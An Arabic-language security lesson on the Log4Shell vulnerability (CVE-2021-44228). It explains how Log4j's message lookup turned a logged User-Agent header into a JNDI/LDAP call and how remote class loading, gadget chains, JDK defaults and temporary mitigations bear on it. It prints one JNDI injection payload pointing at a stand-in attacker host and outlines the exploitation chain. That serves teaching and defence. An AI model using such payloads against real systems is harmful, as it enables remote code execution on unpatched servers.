## كيف تسجيل رسالة صار طريقًا خطيرًا؟

بكانون الأول 2021، أظهرت **Log4Shell — CVE-2021-44228** إن وظيفة عادية مثل تسجيل رسالة ممكن تفتح طريقًا لتنفيذ كود. مكتبة Log4j مستخدمة بتطبيقات Java، والتطبيق كان بده يحفظ معلومات الطلب فقط. بس النص اللي وصله كان ممكن يتحول لعبارة بتفسّرها المكتبة وبتطلب بناءً عليها كائنًا عبر الشبكة.

الفكرة مو إن السجلات مضرة. المشكلة إننا عطينا بيانات غير موثوقة قدرة أكبر من وظيفة «انحفظ كنص». المصدر بيذكر رسالة دردشة واسم مستخدم وترويسة HTTP واسم جهاز كأمثلة لمدخلات عادية. شكل النص البريء مو هو المعيار؛ المهم بأي مكوّن رح يمر، وكيف رح يُفسَّر بعدين.

[أمن المعلومات — Information Security](glossary:information-security)، بالتركي **Bilgi güvenliği**، هدفه حماية المعلومات والأنظمة من الوصول والاستخدام والكشف والتعديل والإتلاف بدون إذن. هالمثال بيشرح ليش لازم نسأل عن **السلوك الممنوع**، مو بس عن نجاح الوظيفة المطلوبة.

## وين البيانات صارت تعليمات؟

سطر التسجيل بالمصدر، بعد قراءة الصورة وتصحيح رموز استخراج النص، هو:

```java
logger.info("Gelen istek, User-Agent: {}", userAgent);
```

القيمة `userAgent` جاية من ترويسة بيقدر العميل يحددها. استعمال `{}` لإدخال معامل ما كان يمنع تفسير الرسالة اللاحق بالمكتبة القديمة المصابة. ميزة **Message Lookup Substitution**، بالتركي **Mesaj araması**، كانت بتبحث بالرسالة المنسّقة عن صيغ `${...}` وبتحلّها.

هون منشوف [الحقن — Injection](glossary:injection): نص المفروض يبقى بيانات صار حامل تعليمات لمفسّر. شكل المثال بالمصدر، كنص للقراءة وليس تنفيذًا، هو:

```text
User-Agent: ${jndi:ldap://saldirgan.example:1389/a}
```

`jndi` بيحدد استخدام **Java Naming and Directory Interface**، أي واجهة أسماء وأدلة Java. و`ldap://` بيشير لخدمة دليل عبر الشبكة، وباقي العنوان والمسار بيحددوا المرجع المطلوب. اسم النطاق هون توضيحي من المصدر، مو هدفًا حيًا.

الكود المبسّط بالمصدر بيورجي `JndiLookup` عم يستدعي `jndiManager.lookup(key)`، وبعدها `this.context.lookup(name)` بطبقة المدير. النقطة المفصلية إن بيانات السجل وصلت لعملية حل كائن عبر الشبكة. لذلك عبارة «تطبيقي ما استدعى دالة خطرة مباشرة» ما بتكفي؛ الاعتماد البرمجي ممكن يستدعيها نيابة عنه.

## اقرأ السلسلة مع شروطها

المصدر بيشرح ست خطوات للمسار التاريخي اللي بيحتاج بيئة تسمح بتحميل صنف بعيد:

1. مدخل متحكم فيه بيحمل صيغة JNDI/LDAP، سواء بترويسة أو برسالة أو باسم.
2. التطبيق بيسجّل القيمة عبر `logger.info`.
3. Log4j المصابة بتفسّر الصيغة وبتحوّلها لمسار `JndiLookup`.
4. JNDI بتتصل بخدمة LDAP المحددة وبتستقبل مرجع كائن.
5. إذا إعدادات ونسخة JVM سمحت، بتجيب الصنف من عنوان HTTP الموجود بـ`javaCodeBase`.
6. مسار مصنع الكائن `getObjectInstance()` ممكن يشغّل الكود ضمن صلاحيات التطبيق.

حتى نفهم سجل LDAP الموجود بكود 1.3، منربط حقوله بوظيفتها:

| الحقل                              | دوره بالمثال                      |
| ---------------------------------- | --------------------------------- |
| `dn`                               | اسم سجل الدليل                    |
| `objectClass: javaNamingReference` | تقديم السجل كمرجع لكائن Java      |
| `javaClassName`                    | اسم الصنف المشار إله              |
| `javaCodeBase`                     | المكان اللي يؤخذ منه الصنف        |
| `javaFactory`                      | صنف المصنع المستخدم بإنشاء الكائن |

هيك منكون حافظنا وظيفة أمثلة الكود الثلاثة، بدل نسخها بدون فهم. [حد الثقة](glossary:trust-boundary) انكسر لما نص من الإنترنت قدر يحرّك عمليات شبكة وكائنات بصلاحيات البرنامج. **توضيح إضافي:** الوصول لمسار السجل، ونجاح الاتصال، وسلوك بيئة التشغيل شروط منفصلة؛ مو كل تطبيق Java بيحقق هالسلسلة لمجرد إنه مكتوب بـJava.

## ليش تحديث JDK وحده مو نفس إصلاح Log4j؟

المصدر بينبّه إن JDK 8u191 عطّل افتراضيًا تحميل الأصناف من codebase بعيد عبر LDAP. هالشي ظاهر بـ[كود OpenJDK 8u191](https://raw.githubusercontent.com/openjdk/jdk8u/jdk8u191-b12/jdk/src/share/classes/com/sun/jndi/ldap/VersionHelper12.java): الخاصية `com.sun.jndi.ldap.object.trustURLCodebase` افتراضها `false`. هالإجراء بيقيّد طريق تحميل الصنف البعيد بالخطوة الخامسة.

بس المصدر بيذكر مسارات ثانية ببيئات مناسبة: كائنات متسلسلة بتتفاعل مع أصناف موجودة أصلًا ضمن classpath لتشكّل [سلسلة Gadgets](glossary:gadget-chain). الفكرة إن آثار عمليات بأصناف موجودة بتنربط لتنتج سلوكًا غير مقصود. **إضافة تعليمية:** هالمسار كمان بده أصناف وإعدادات وشروط مناسبة؛ ما منقول إن كل تركيب فيه تلقائيًا نفس سلسلة الاستغلال.

العبرة مو إن طبقة الحماية ما إلها قيمة. العبرة إن **منع طريق واحد مو مساويًا لإزالة كل طرق الخلل**. هاد نفس منطق الطرق البديلة بـ[أشجار الهجوم](topic:attack-trees-portal-model).

[ملاحظات إصدار Apache](https://logging.apache.org/log4j/2.x/release-notes.html#release-notes-2-15-0) بتذكر تاريخ **6 كانون الأول 2021** والبروتوكولات `java` و`ldap` و`ldaps` ضمن القيود.

## التخفيف المؤقت مو رقعة شاملة

المصدر بيذكر، كإجراءات إسعافية تاريخية، الخاصية `-Dlog4j2.formatMsgNoLookups=true` للإصدارات 2.10 وما بعدها، أو إزالة `JndiLookup.class` من JAR. هاد مثال على تقليل بعض الطرق بالوقت اللي ما كان ممكن فيه تطبيق الرقعة فورًا، مو وصفة حالية بتضمن معالجة كل CVE لاحقة.

**Mitigation**، بالتركي **Azaltım**، بيخفف احتمالًا أو مسارًا، بينما **Patch/Fix**، بالتركي **Yama/Düzeltme**، بيعالج الخلل المعني. لازم نعرف لأي نسخة وأي ظروف عم نحكي قبل ما نساوي بينهم.

المصدر بيختم بفكرة إن اعتمادًا غير محدّث، منفذًا منسيًا، كلمة مرور افتراضية أو موافقة متسرعة على رسالة، ممكن يكونوا أول حلقة بسلسلة أكبر. تعلّم رؤية هالعلاقات قبل ما تكبر السلسلة هو جوهر [التفكير الأمني](topic:security-mindset)، ومنحوّله لخطوات بـ[نمذجة التهديدات](topic:threat-modeling-stride).
